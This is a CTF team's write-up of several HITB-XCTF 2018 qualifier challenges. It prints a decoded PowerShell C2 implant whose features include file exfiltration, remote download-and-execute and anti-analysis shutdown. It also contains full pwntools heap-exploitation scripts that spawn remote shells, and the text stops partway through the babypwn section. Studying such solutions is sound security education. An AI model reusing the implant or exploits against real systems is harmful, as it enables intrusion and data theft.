---
title: "hitbxctfqual writeups"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "rsa", "format-string", "sqli", "radare2", "upx", "packer", "pcap", "wireshark", "usb-hid", "firmware", "base64"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20180411-hitbxctfqual/README.md"
ctf:
  name: "hitbxctfqual"
  year: 2018
---

## Source

- **CTF:** hitbxctfqual 2018
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20180411-hitbxctfqual/README.md>

---
# HITB-XCTF GSEC CTF 2018 Quals


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20180411-hitbxctfqual/) of this writeup.**


 - [HITB-XCTF GSEC CTF 2018 Quals](#hitb-xctf-gsec-ctf-2018-quals)
   - [rev](#rev)
     - [hacku (sces60107)](#hacku-sces60107)
     - [sdsun (sces60107 sasdf)](#sdsun-sces60107-sasdf)
     - [hex (sasdf)](#hex-sasdf)
       - [First try](#first-try)
       - [Second try](#second-try)
   - [misc](#misc)
     - [tpyx (sces60107)](#tpyx-sces60107)
     - [readfile (sces60107)](#readfile-sces60107)
     - [pix (sces60107)](#pix-sces60107)
   - [pwn](#pwn)
     - [once (kevin47)](#once-kevin47)
       - [Vulnerability](#vulnerability)
       - [Exploit](#exploit)
     - [gundam (kevin47)](#gundam-kevin47)
       - [Overview](#overview)
       - [Vulnerability](#vulnerability-1)
       - [Leak](#leak)
       - [Exploit](#exploit-1)
     - [d (kevin47)](#d-kevin47)
       - [Overview](#overview-1)
       - [Vulnerability](#vulnerability-2)
       - [Exploit](#exploit-2)
     - [babypwn (how2hack)](#babypwn-how2hack)
       - [Vulnerability](#vulnerability-3)
       - [Solution](#solution)
       - [Exploit](#exploit-3)
   - [web](#web)
     - [Upload (bookgin)](#upload-bookgin)
       - [Find the target](#find-the-target)
       - [Brute force the path and RCE](#brute-force-the-path-and-rce)
     - [Python's revenge (sasdf)](#pythons-revenge-sasdf)
       - [Payload](#payload)
     - [PHP lover (bookgin &amp; sces60107)](#php-lover-bookgin--sces60107)
       - [Possible SQL injection](#possible-sql-injection)
       - [Bypass WAFs](#bypass-wafs)
         - [Email format regex check](#email-format-regex-check)
         - [Hacker Filter](#hacker-filter)
       - [Get the flag](#get-the-flag)
     - [baby baby (bookgin)](#baby-baby-bookgin)
       - [Recon](#recon)
       - [RCE](#rce)
     - [baby nya (bookgin)](#baby-nya-bookgin)
       - [Exposed Jserv protocol](#exposed-jserv-protocol)
       - [Exploit the jolokia](#exploit-the-jolokia)
     - [baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)](#baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-qq-group)
     - [3pigs (unsolved, written by how2hack)](#3pigs-unsolved-written-by-how2hack)
       - [Hint](#hint)
       - [Web Challenge? WutFace](#web-challenge-wutface)
       - [First stage (Misc)](#first-stage-misc)
       - [Python Format String Vulnerability](#python-format-string-vulnerability)
       - [Second stage (Pwn)](#second-stage-pwn)
       - [Vulnerability](#vulnerability-4)
       - [Solution...?](#solution-1)
   - [crypto](#crypto)
     - [easy_block (sasdf)](#easy_block-sasdf)
       - [Vulnerability](#vulnerability-5)
       - [Construct payload](#construct-payload)
       - [Construct hash](#construct-hash)
     - [easy_pub (sasdf)](#easy_pub-sasdf)
     - [streamgamex (sasdf)](#streamgamex-sasdf)
     - [base (how2hack)](#base-how2hack)
   - [mobile](#mobile)
     - [kivy simple (sces60107)](#kivy-simple-sces60107)
     - [multicheck (sasdf)](#multicheck-sasdf)



## rev

### hacku (sces60107)

In this challenge give us two file. A pcap file and a chm file.

The chm file is useless. The pcap file has a large size, because it is downloading windows update file.

After some digging, I found the dns query is interesting. we can extract some base64 string. And I found a script after base64 decoding.
```ps1=
$GET_FILE = 'get-fle' 
$DOWN_EXEC = 'dow-exe'
$RUN_CMD = 'run-cmd'

$GET_REG = 'get-reg'
$GET_TASK = 'get-tak'
$GET_UPDATE = 'get-upd'
$GET_REP = 'get-rep'

$STATUS_INIT  = 0x0000
$STATUS_REGED = 0x8000
$STATUS_TASK  = $STATUS_REGED -bor 0x1
$STATUS_PADD  = $STATUS_REGED -bor 0x2


$url = 'http://192.168.99.234/cc/cc.php'
$status = $STATUS_INIT
$task = $null
$running = $True

$pubk = (1501,377753)

function get-Md5Hash($str)
{
	$md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
	$utf8 = new-object -TypeName System.Text.UTF8Encoding
	$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($str)))
	return $hash -replace '-'
}

function get-ComputeName
{
	try
	{
		return (Get-WmiObject Win32_ComputerSystem).Name;
	} catch 
	{
		return "ErrComputeName";
	}
}

function get-clientID
{
	try
	{
		$did = (wmic diskdrive get SerialNumber)
		$cid = get-Md5Hash $did
		return $cid
	}
	catch
	{
		$CompName = get-ComputeName
		return get-Md5Hash $CompName
	}
}
function Reg-Info
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REG
	return @{c = $c ; x = $clientID ;e = $time ; i = 0} |  ConvertTo-Json
}
function get-Task
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_TASK
	return @{c = $c ; x = $clientID ;e = $time  ; i = 0} |  ConvertTo-Json
}
function EttRRRRRRhd ( $tid , $taskinfo )
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REP
	return @{c = $c ; x = $clientID ;e = $taskinfo; i = $tid} |  ConvertTo-Json
}

function check_VM()
{
	$p = @("win32_remote","win64_remote64","ollydbg","ProcessHacker","tcpview","autoruns","autorunsc","filemon","procmon","regmon","procexp","idaq","idaq64","ImmunityDebugger","Wireshark","dumpcap","HookExplorer","ImportREC","PETools","LordPE","dumpcap","SysInspector","proc_analyzer","sysAnalyzer","sniff_hit","windbg","joeboxcontrol","joeboxserver")
	for ($i=0; $i -lt $p.length; $i++) {
		if(ps -name $p[$i] -ErrorAction SilentlyContinue){
			shutdown /s /f /t 0
			exit
		}
	}
}

function YTRKLJHBKJHJHGV($msg)
{
	while($True)
	{
		try
		{
			$content = $msg
			$webRq = [System.Net.WebRequest]::Create($url)
			$webRq.proxy = [Net.WebRequest]::GetSystemWebProxy()
			$webRq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
			
            
            #
            
            $content = YNHGFOI8YIUGH $content
            
            
            #
            $content = OPKE3989hYYY $pubk $content
            #
            
            #
            $content = YNHGFOI8YIUGH $content
            
			$enc = [System.Text.Encoding]::UTF8.GetBytes($content)
            
            #

			$webRq.Method = 'POST'
			$webRq.ContentLength = $enc.length
			
			
			if ($enc.length -gt 0)
			{
				$req_stream = $webRq.GetRequestStream()
				$req_stream.Write($enc , 0 , $enc.length)
				
			}
			
			[System.Net.WebResponse] $rep = $webRq.GetResponse()
			if ($rep -ne $null)
			{
				$data = $rep.GetResponseStream()
				[System.IO.StreamReader] $res_d = New-Object System.IO.StreamReader $data
				[String] $result = $res_d.ReadToEnd()
 			}
		}
		catch
		{
			$result = 'err'
            #
		}
		
		if ($result -eq 'err')
		{
			
		}
		else
		{
            
			return $result
		}
	}
}

function POIUIGKJNBYFF($msg)
{

    $msg = OKMNHGGGGSSAAA $pubk $msg
	$msg = ConvertFrom-Json -InputObject $msg
	return $msg.r,$msg.e
}

function YNHGFOI8YIUGH( $str )
{
	return [Convert]::ToBase64String( [System.Text.Encoding]::Utf8.GetBytes($str))
}

function VCDHJIIDDSQQQ( $b64 )
{
	return [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($b64))
}

function POPOUIUJKKKI($file)
{
	return YNHGFOI8YIUGH (Get-Content $file)
}

function MJOOLLFGFASA($name)
{
	$filelist = @()
	$result = @{}
	
	for ($i = 0x43 ; $i -lt 0x5b; ++ $i)
	{
		try
		{   $dc = '{0}:/' -f ([char]$i)
			$file = Get-ChildItem "$dc" -recurse $name | %{$_.FullName}
			if ($file.length -gt 0)
			{
				$filelist += $file
			}
		}
		catch
		{
			continue
		}
	}
	
	$result.ct = $filelist.length
	$result.dt = @()
	foreach( $f in $filelist)
	{
		$fd = POPOUIUJKKKI $f
		$result.dt += @{path=(YNHGFOI8YIUGH $f ); txt=$fd}
	}
	return ConvertTo-Json -InputObject $result 
}


function DXCFGIOUUGKJB764($x, $h, $n)
{
   $y = 1
   while( $h -gt 0 )
   {
        if ( ( $h % 2 ) -eq 0)
        {
            $x = ($x * $x) % $n
            $h = $h / 2
        }else
        {
            $y = ($x * $y) % $n
            $h = $h - 1
        }
   }
   return $y
}

function OPKE3989hYYY($pk , $plaintext)
{
    $key , $n = $pk
    $arr = @()
    for ($i = 0 ; $i -lt $plaintext.length ; $i++)
    {
     $x = DXCFGIOUUGKJB764 ([int] $plaintext[$i]) $key $n
     $arr += $x
    }
    return $arr
}
function OKMNHGGGGSSAAA($pk,$enctext)
{
    $key , $n = $pk
    $txt = ""

    $enctext = VCDHJIIDDSQQQ $enctext
    [int[]]$enctab =  $enctext -split ' '
    foreach ($x in $enctab)
    {
        if ($x -eq 0)
        {
            continue
        }
        $x = DXCFGIOUUGKJB764 $x $key $n
        $txt += [char][int]$x
    }
    $txt = VCDHJIIDDSQQQ($txt)
    return $txt
}

function UIHIUHGUYGOIJOIHGIHGIH($cmd)
{
	$cmd = ConvertFrom-Json -InputObject $cmd
	$c = $cmd.c
	$i = $cmd.i
	$e = $cmd.e
	$x = $cmd.x 
	
	#
	#
	
	if ($c -eq $GET_FILE)
	{
		
		$d = MJOOLLFGFASA $e
	}
	elseif ($c -eq $RUN_CMD)
	{
		
		$d = Invoke-Expression $e -ErrorAction SilentlyContinue
	}
	elseif ($c -eq $DOWN_EXEC)
	{
		
		$d = Invoke-Expression ((New-Object Net.WebClient).DownloadString("$e")) -ErrorAction SilentlyContinue
	}
return @($i , $d)
}


$MuName = 'Global\_94_HACK_U_HAHAHAHAHA'
$retFlag = $flase
$Result = $True 
$MyMutexObj = New-Object System.Threading.Mutex ($true,$MuName,[ref]$retFlag)
if ($retFlag)
{
	$Result = $True
}
else
{
	$Result = $False
}

if ($Result)
{
	while($True -and $running)
	{
		
		if($status -eq $STATUS_INIT)
		{
			
			$OO0O0O0O00 = Reg-Info
			
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
            
			$r,$e = POIUIGKJNBYFF($ret)
            
            
			if ($r -eq 'yes' -and $e -eq 'ok_then_u_go')
			{
				$status = $STATUS_PADD
				
				
			}
		}
		if ($status -eq $STATUS_PADD)
		{
			
			
			$OO0O0O0O00 = get-Task
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			$r,$e = POIUIGKJNBYFF($ret)
			if ($r -eq 'yes')
			{
				
				$task = $e
				$status = $STATUS_TASK
			}
			
		}
		if ($status -eq $STATUS_TASK)
		{
			
			
			#
			$ret = UIHIUHGUYGOIJOIHGIHGIH($task)
			$OO0O0O0O00 = EttRRRRRRhd $ret[0] $ret[1]
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			
			$r,$e = POIUIGKJNBYFF($ret)
			if ($r -eq 'yes')
			{
				$status = $STATUS_PADD
				$task = $null
			}
		}
		
		sleep 3
	}
	$MyMutexObj.ReleaseMutex() | Out-Null
	$MyMutexObj.Dispose() | Out-Null
}
else
{

}
```

They use `rsa` to encrypt message. the n is easy to factor.

Still, we can find out the encrypted message from pcap file.

We also extract two things from those message. The first one is a rar file, the second is a ps1 script.

We cannot open the rar file. After a few hour, the host change the challenge. Now we have flag part1 instead of rar file. The flag part1 is `HITBXCTF{W0rk_1n_th3_dark_`

Let's see the ps1 script. It actually generate a exe file at the temp directory.

Then, we can reverse that exe file.

I found out that it's trying to write something on MBR. 

The final step is reversing what it write on MBR. It's 80286 architecture.

Now we just need decode the encryted flag part2.
```python=
ciphertext='%\xa19\x89\xa6\x9d\xd5\xa5u\x8dJ\x92\xf1Y^\x91'
def ror(a,b):
  return (a>>b)|(a<<(8-b))
def rol(a,b):
  return (a<<b)|(a>>(8-b))
flag=""
table=[]
#maintain a table
for j in range(256):
  x=j
  x=ror(x,3)%256
  x^=0x74
  x=rol(x,5)%256
  x+=0x47
  x%=256
  if(x%2==0):
    teble.append(x-1)
  else:
    table.append(x+1)
for i in ciphertext:
  flag+=chr(table.index(ord(i)))
print flag
```

### sdsun (sces60107 sasdf)

The first thing you will notice is that the binary is packed by upx.

The way I unpack the binary is using gdb. I let the binary exectue for a while. It will be unpacked in the memory. So I can dump the whole memory in gdb.

Now I have the unpacked binary. but it is hard to understand it.

I found some feature indicating that this binary is written in Go language.

Then I use this [script](https://gitlab.com/zaytsevgu/goutils/blob/master/go_renamer.py) to recover the symbol. It will be much easier to understand this binary.
![](https://i.imgur.com/ysBuyUy.png)

It seems like there is a backdoor. This binary will listen to a random port. And it will output the port number.

The communication with the backdoor is compressed. and it use zlib. Also, the communication format is json.

The backdoor will give you flag if your command is `{"action":"GetFlag"}`. We found this rule in `main.Process`
![](https://i.imgur.com/w487Voi.png)

Now we have the flag `HITB{4e773ff1406800017933c9a1c9f14f35}`





### hex (sasdf)
A arduino challenge, data is in intelhex format. I use helper script `hex2bin.py` from intexHex python library to generate binary.

#### First try
Loaded in disassembler with MCU as AVR, you can easily find pattern below keep repeating started from 0x987 (in IDA, or 0x130e in radare2)
```asm
ldi r22, 0xXX
ldi r24, 0x77
ldi r25, 0x01
call 0xffa
ldi r22, 0xf4
ldi r23, 0x01
ldi r24, 0x00
ldi r25, 0x00
call 0xbda
ldi r22, 0xXX
ldi r24, 0x77
ldi r25, 0x01
call 0xf62
ldi r22, 0x88
ldi r23, 0x13
ldi r24, 0x00
ldi r25, 0x00
call 0xbda
```
I dumped all `XX` bytes in previous pattern but didn't figure out how to decode it. So I decided to dig into these functions. It tooks me about half hour to manually decompile `fcn.ffa` to following (wrong) psuedo code:
```python
r26 = 0x77
if r22 >= 136:
    r31 = 0
    r30 = r22 & 0x7f
    mem[0x77+4] |= (1 << r30)
    r22 = 0
else:
    r22 + 0x78

if r22 not in mem[0x77+6:0x77+0xc]: # six slots
    try:
        slot = mem[0x77+6:0x77+0xc].index(0)
    except:
        mem[0x77+3] = 0
        mem[0x77+2] = 1
        return
    mem[0x77+6+slot] = r22

fcn_e7e()
```
I gave up.

#### Second try
After the third hint `Keyboard` is out, I suddenly realized that MCU of Arduino Micro is ATmega32u4, a USB enabled device, rather than common arduino MCU ATmega328p. Everything makes sense now. The structure in 0x77 must be USB keyboard report which has 6 slot (a obvious sign if you are familar with NKRO or know the difference between PS2 and USB keyboard). Here's source code from Arduino's Keyboard library:
```C++
size_t Keyboard_::press(uint8_t k) 
{
	uint8_t i;
	if (k >= 136) {			// it's a non-printing key (not a modifier)
		k = k - 136;
	} else if (k >= 128) {	// it's a modifier key
		_keyReport.modifiers |= (1<<(k-128));
		k = 0;
	} else {				// it's a printing key
		k = pgm_read_byte(_asciimap + k);
		if (!k) {
			setWriteError();
			return 0;
		}
		if (k & 0x80) {						// it's a capital letter or other character reached with shift
			_keyReport.modifiers |= 0x02;	// the left shift modifier
			k &= 0x7F;
		}
	}
	
	// Add k to the key report only if it's not already present
	// and if there is an empty slot.
	if (_keyReport.keys[0] != k && _keyReport.keys[1] != k && 
		_keyReport.keys[2] != k && _keyReport.keys[3] != k &&
		_keyReport.keys[4] != k && _keyReport.keys[5] != k) {
		
		for (i=0; i<6; i++) {
			if (_keyReport.keys[i] == 0x00) {
				_keyReport.keys[i] = k;
				break;
			}
		}
		if (i == 6) {
			setWriteError();
			return 0;
		}	
	}
	sendReport(&_keyReport);
	return 1;
}
```
Ahh, `fcn.ffa` is `Keyboard::_press`!! It turns out that `fcn.f62` is `Keyboard::_release` and `fcn.bda`, which use timer register `TCNT0`, is `delay`.

Take our previous dump of parameters, convert it to keystroke, and the flag shows up.
```
      $##&:|#|                          !##| ;&&&&&&$#   #$##@|.    `%##@;  :@#$`
     |#|   |#|                         ;#%.  !#!       .%#|  #&#!  |#|  #&@:  :#%.
   ;#####|.|#|  .|####$`   #&###|!@%.  ;#|   |#;              |#! :@$`   ;#%.`:@%.
     |#!   |#|   `.  :@$` ;#&#  .%#%.  !#|  .%##@&##@#      :&#!  ;#%.   :@$`  #&$`
     |#!   |#|  `%#####&#.%#!#####;#%`!#@;          ;#$`   ;##!    ;#$`   ;#%.` $#$`
     |#!   |#| .%#@%&@#&#  |####&&#%.  ;#|   !##@@##%` :@#######$. `$##@##!   @%.
```

P.S. I think if you find an Arduino Micro, burn the firmware, plug into PC, then you will get the flag in one hour. No reverse needed.

## misc

### tpyx (sces60107)

The png file is broken. It seems like We need to fix it first.
`pngcheck` tell us that it has crc checksum error
```shell
$ pngcheck -v e47c7307-b54c-4316-9894-5a8daec738b4.png 
File: e47c7307-b54c-4316-9894-5a8daec738b4.png (1164528 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1024 x 653 image, 32-bit RGB+alpha, non-interlaced
  chunk IDAT at offset 0x00025, length 1162839
    zlib: deflated, 32K window, default compression
  CRC error in chunk IDAT (computed ecfb2a19, expected ba3de214)
ERRORS DETECTED in e47c7307-b54c-4316-9894-5a8daec738b4.png
```

When you try to fix the crc checksum, you will notice that  the size of IDAT chunk is also wrong. The true size is 1164470 not 1162839

After corrected all faults, just use `zsteg` to detect any interesting things and also extract them.
```shell
$ zsteg e47c7307-b54c-4316-9894-5a8daec738b4_fixed.png
[?] 1 bytes of extra data after image end (IEND), offset = 0x11c4ef
extradata:imagedata .. file: zlib compressed data
...
...
$ zsteg e47c7307-b54c-4316-9894-5a8daec738b4_fixed.png -e extradata:imagedata > zlibdata
$ python -c "import zlib; print zlib.decompress(open('zlibdata').read())" > data
$ cat data
377abcaf271c000382f96c91300000000000000073000000000000003c0e24409c429fdb08f31ebc2361b3016f04a79a070830334c68dd47db383e4b7246acad87460cd00ba62cfae68508182a69527a0104060001093000070b0100022406f107010a5307cb7afbfaec5aa07623030101055d0000010001000c2c2700080a01c35b933000000501110b0066006c00610067000000120a010000844bf3571cd101130a010000e669e866d1d301140a010080ffcdd963d1d301150601008000000000001800345172634f556d365761752b5675425838672b4950673d3d
$ cat data | xxd -r -p > data
$ file data
data.7z: 7-zip archive data, version 0.3

```
Now we have a 7z file, but we need password.
The 7z file is actually appended with the password.
```shell
$ xxd data
00000000: 377a bcaf 271c 0003 82f9 6c91 3000 0000  7z..'.....l.0...
00000010: 0000 0000 7300 0000 0000 0000 3c0e 2440  ....s.......<.$@
00000020: 9c42 9fdb 08f3 1ebc 2361 b301 6f04 a79a  .B......#a..o...
00000030: 0708 3033 4c68 dd47 db38 3e4b 7246 acad  ..03Lh.G.8>KrF..
00000040: 8746 0cd0 0ba6 2cfa e685 0818 2a69 527a  .F....,.....*iRz
00000050: 0104 0600 0109 3000 070b 0100 0224 06f1  ......0......$..
00000060: 0701 0a53 07cb 7afb faec 5aa0 7623 0301  ...S..z...Z.v#..
00000070: 0105 5d00 0001 0001 000c 2c27 0008 0a01  ..].......,'....
00000080: c35b 9330 0000 0501 110b 0066 006c 0061  .[.0.......f.l.a
00000090: 0067 0000 0012 0a01 0000 844b f357 1cd1  .g.........K.W..
000000a0: 0113 0a01 0000 e669 e866 d1d3 0114 0a01  .......i.f......
000000b0: 0080 ffcd d963 d1d3 0115 0601 0080 0000  .....c..........
000000c0: 0000 0018 0034 5172 634f 556d 3657 6175  .....4QrcOUm6Wau
000000d0: 2b56 7542 5838 672b 4950 673d 3d         +VuBX8g+IPg==
$ 7z x data -p4QrcOUm6Wau+VuBX8g+IPg==
..
Extracting  flag
..
$ cat flag
HITB{0c88d56694c2fb3bcc416e122c1072eb}
```

### readfile (sces60107)

It seems like the non-punctuation letter will be filtered.

So I try to readfile with `Arithmetic expansion`

The payload is `$(</????/????_??_????/*)`

Then we can read the flag `HITB{d7dc2f3c59291946abc768d74367ec31}`

### pix (sces60107)

Use `zsteg` to extract a keepassX database file

```shell
$ zsteg aee487a2-49cd-4f1f-ada6-b2d398342d99.SteinsGate
imagedata           .. text: " !#865   "
b1,r,msb,xy         .. text: "y5b@2~2t"
b1,rgb,lsb,xy       .. file: Keepass password database 2.x KDBX
b2,r,msb,xy         .. text: "\rP`I$X7D"
b2,bgr,lsb,xy       .. text: "b;d'8H~M"
b4,g,msb,xy         .. text: ";pTr73& dvG:"
$ zsteg aee487a2-49cd-4f1f-ada6-b2d398342d99.SteinsGate -e b1,rgb,lsb,xy > keedatabase.kbdx
```

Now we have to launch a dictionary attack against this database. then I found [this](https://www.rubydevices.com.au/blog/how-to-hack-keepass)

Finally, I found the password and also found the flag found the flag from the database.

The flag is `HITB{p1x_aNd_k33pass}`






## pwn

### once (kevin47)

#### Vulnerability
* Fd and bk of the link list can be overwritten

#### Exploit
```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('47.75.189.102', 9999)
lib = ELF('./libc-2.23.so')

# leak
r.sendline('0')
r.recvuntil('choice\n')
x = r.recvuntil('>', drop=True)
libc = int(x, 16) - 0x6f690
lib.address = libc
print hex(libc)

# stage 1
# overwrite bk
r.sendline('2')
ubin = libc + 0x3c4b70-8+0x10+8
r.send(flat(0xdeadbeef, 0x101, 0xdeadbeef, ubin))
r.sendlineafter('>', '1')
# unlink
r.sendlineafter('>', '3')   # ubin -> bss

# stage 2
#r.sendline('4')
r.sendlineafter('>', '4')
# alloc on bss
r.sendlineafter('>', '1')
r.sendlineafter('size:', str(0x100-8))
# write bss
stdout, stdin = libc+0x3c5620, libc+0x3c48e0
binsh = libc+1625367
payload = [
    0, lib.symbols['__free_hook'],     # link list bk to overwrite free hook
    stdout, 0,
    stdin, 0,
    0, binsh,     # ptr containing "/bin/sh"
    [0]*10,     # flags = 0
]
r.sendlineafter('>', '2')
r.send(flat(payload))
# we can edit1 again :), plus bk is on free hook
# back to stage 1
r.sendlineafter('>', '4')

# ovewrite free_hook
r.sendlineafter('>', '2')
r.send(flat(lib.symbols['system']))

# stage 2
r.sendlineafter('>', '4')
# free(ptr) == system("/bin/sh")
r.sendlineafter('>', '3')


r.interactive()

# HITB{this_is_the_xxxxxxx_flag}
```

### gundam (kevin47)

#### Overview
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```
There are 4 operations:
1. Build a gundam
2. Visit gundams
3. Destroy a gundam
4. Blow up the factory

The structure of a gundam is:
```
     +---------+
     |flag     |              0x100
     +---------+     +--------------------+
     |name_ptr |---->|        name        |   
0x28 +---------+     +--------------------+
     |type(str)|
     |         |
     |         |
     +---------|
```
* An array of pointer to the gundam structure is on bss.
* When a gundam is builded, the program malloc chunks of size 0x28 and 0x100 as shown above, set them properly, and store into the array of pointer on bss.
* Visit gundams prints gundams' index, name and type that are not destroyed.
* Destroy a gundam sets the flag to 0 and frees the name
* Blow up the factory frees the gundam structures that flag are 0.

#### Vulnerability
* Read name without ending null byte, which can be used to leak.
* Destroy a gundam does not clear the name_ptr, which leads to use after free (double free).
* The program is running with libc-2.26, which implemented a new feature called tcache to improve performance. However, it does not perform any sanity check for performance's sake. That is, fastbin dup attack  can be done anywhere any size without satisfying the size's contraint.

#### Leak
* Leaking libc addres will be a little bit more complicated than older versions of libc, since tache acts like fastbins and only have heap address on it.
* However, tcache has a maximun of 7 chunks. By freeing more than 7 chunks, the remaining chunks will be treated as usual. That is, the chunks of size 0x100 will be at unsorted bins and small bins rather than tache, which contains libc address.

#### Exploit
* Leak libc and heap addresses.
* Use fastbin dup attack to malloc a chunk on **&__free_hook**. Note that in older version of libc we have to `free(a); free(b); free(a);` to bypass double free check. But tache doesn't check, so it can be done simply by `free(a); free(a);`
* Overwrite **__free_hook** to **system**. After that, Destroying a gundam with the name `/bin/sh`, which calls `free(name)` will be converted to `system("/bin/sh")`


``` python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('47.75.37.114', 9999)
lib = ELF('./libc.so.6')

def build(name, typee):
    r.sendlineafter('choice : ', '1')
    r.sendafter('gundam :', name)
    r.sendlineafter('gundam :', str(typee))

def visit():
    r.sendlineafter('choice : ', '2')
    return r.recvuntil('1 . Build', drop=True)

# double free
def destroy(idx):
    r.sendlineafter('choice : ', '3')
    r.sendlineafter('Destory:', str(idx))

def blow_up():
    r.sendlineafter('choice : ', '4')


# leak
for i in range(9):
    build(chr(0x11*(i+1))*16, 0)
for i in range(8):
    destroy(i)
blow_up()
for i in range(7):
    build(chr(0x11*(i+1)), 0)
build('a'*8, 0)
x = visit()
xx = re.findall('0\] :(.*)Type\[0', x, re.DOTALL)[0]
heap = u64(xx.ljust(8, '\x00')) - 0x811
xx = re.findall('aaaaaaaa(.*)Type\[7', x, re.DOTALL)[0]
libc = u64(xx.ljust(8, '\x00')) - 0x3dac78
lib.address = libc
print hex(heap)
print hex(libc)

# exploit
# trigger double free libc 2.26 doesn't do any sanity check on tcache
# libc 2.26 is awesome!!
destroy(2)
destroy(1)
destroy(0)
destroy(0)
blow_up()
build(flat(lib.symbols['__free_hook']), 0)
build('/bin/sh\x00', 0)
build(flat(lib.symbols['system']), 0)
destroy(1)

#embed()
r.interactive()

# HITB{now_you_know_about_tcache}
```

### d (kevin47)

#### Overview
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
There are 3 operations:
1. Read message
2. Edit message
3. Wipe message

* On read message, we enter a base64 encoded string, the program decodes it and stores in the heap, with ending null byte
* Edit message read `strlen(message)` bytes to the message.
* Wipe message frees the message and clears the pointer

#### Vulnerability
* Base64 decode does not check the length properly. If we send `'YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ'` which is `base64encode('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')` without the ending `'=='`, the decoder miscalculates the length of the string, which leads to no ending null byte. Edit message then could be used to overwrite next chunk's size.

#### Exploit
* Use poinson null byte to create overlapped chunks.
* Use fastbin dup attack to malloc a chunk on bss, where the pointers are.
* We can overwrite the pointers, which leads into arbitrary memory write.
* Change free@got to puts@plt, this enable us to leak libc address.
* Change atoi@got to system. After this, when reading choice we can enter `/bin/sh`, which calls `atoi(buf)` that is `system('/bin/sh')` now.
```python 
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('47.75.154.113', 9999)

def new_msg(idx, content):
    r.sendlineafter('Which? :', '1')
    r.sendlineafter('Which? :', str(idx))
    r.sendlineafter('msg:', content)

def edit_msg(idx, content, pwn=0):
    r.sendlineafter('Which? :', '2')
    r.sendlineafter('Which? :', str(idx))
    if pwn:
        r.sendafter('msg:', content)
    else:
        r.sendlineafter('msg:', content)

def del_msg(idx):
    r.sendlineafter('Which? :', '3')
    r.sendlineafter('Which? :', str(idx))

def b64e(c):
    return c.encode('base64').replace('\n', '')

def exp_new_msg(idx, content):
    b64 = b64e(content)
    if b64[-2] == '=':
        new_msg(idx, b64[:-2])
    elif b64[-1] == '=':
        new_msg(idx, b64[:-1])
    else:
        new_msg(idx, b64)

# 40 & 41 are the magic numbers :)
exp_new_msg(0, 'a'*40)
new_msg(1, b64e('a'*0x203))
new_msg(2, b64e('a'*0x100))
edit_msg(1, flat(
    [0xdeadbeef]*28,
    0xf0, 0x20,
    0, 0,
    [0xaabbccdd]*30,
    0x200, 0x120,
))

# overflow 1's size (unsorted bin)
del_msg(1)
edit_msg(0, 'a'*40)

new_msg(3, b64e('b'*0x100))
new_msg(4, b64e('c'*0x60))
del_msg(3)
del_msg(2)
# for fastbin attack
del_msg(4)

# overlapped chunks, overwrite fastbin->fd
new_msg(5, b64e('d'*0x200))
fast_bin_addr = 0x60216d
edit_msg(5, flat(
    [0]*32,
    0, 0x71,
    fast_bin_addr,
))

new_msg(6, b64e('a'*0x60))
# on bss
new_msg(60, b64e('A'*0x60))
free_got = 0x602018
strlen_got = 0x602028
atoi_got = 0x602068
puts_plt = 0x400770
alarm_plt = 0x4007b0
edit_msg(60, 'BBB'+flat(free_got, atoi_got, atoi_got, strlen_got))

# free -> puts
edit_msg(0, flat(puts_plt))
# free(1) == puts(atoi_got)
del_msg(1)
x = r.recvuntil('1. read')
xx = x[8:14].ljust(8, '\x00')
libc = u64(xx)-0x36e80
system = libc + 0x45390
print 'libc:', hex(libc)

# strlen -> alarm to bypass read_n len restriction
edit_msg(3, flat(alarm_plt))
# atoi -> system
edit_msg(2, flat(system)[:-1])
r.sendline('/bin/sh')

r.interactive()

# HITB{b4se364_1s_th3_b3st_3nc0d1ng!}
```

### babypwn (how2hack)

#### Vulnerability
A challenge with format string vulnerability without given binary.

#### Solution
My first intuition is to find the `.got.plt` section and overwrite something into `system`. As the binary has no PIE enabled (can find out by leaking some address out and you will notice there are a lot of address start with `0x40XXXX` or `0x60XXXX`), we can guess the `.got.plt` section is around `0x601000`.

```
0x601000 0x202020600e20
0x601008 0x7fb6b4617168
0x601010 0x7fb6b4407870
0x601018 0x7fb6b409c6b0
0x601020 0x102020202020 # ????
0x601028 0x7fb6b4094d80
0x601030 0x7fb6b4123d60
```
I was unable to leak `0x601020` for some reason.
I try to leak the called functions as well.
```
0x4003c5 gets    ?@
0x4003ca stdin    ?@
0x4003d0 printf    ?@
0x4003d7 stdout    ?@
0x4003de stderr    ?@
0x4003e5 usleep    ?@
0x4003ea setbuf    ?@
0x4003f1 __libc_start_main    ?@
```
